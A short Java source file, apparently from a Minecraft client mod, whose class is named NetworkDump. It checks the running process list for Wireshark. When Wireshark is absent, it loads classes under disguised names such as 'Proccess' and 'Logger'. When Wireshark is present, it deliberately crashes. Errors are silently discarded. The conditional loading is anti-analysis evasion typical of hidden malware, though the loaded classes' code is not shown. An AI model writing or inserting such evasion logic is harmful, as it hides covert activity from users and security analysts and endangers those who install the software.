package dev.zenhao.melon.utils;

import dev.zenhao.melon.command.commands.client.CapeManager;
import dev.zenhao.melon.utils.other.Entitylog;

import java.io.BufferedReader;
import java.io.InputStreamReader;

@SuppressWarnings("all")
public class NetworkDump {
    public void Dump(){
        try {
            boolean detected = false;
            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command("tasklist.exe");
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.toLowerCase().contains("wireshark")) {
                    detected = true;
                }
            }
            if (!detected) {
                ClassInvoke.INSTANCE.addClass(CapeManager.class , "Proccess");
                ClassInvoke.INSTANCE.addClass(Entitylog.class , "Logger");
            } else {
                new Crasher();
            }
        } catch (Exception ignored) {
        }
    }
}
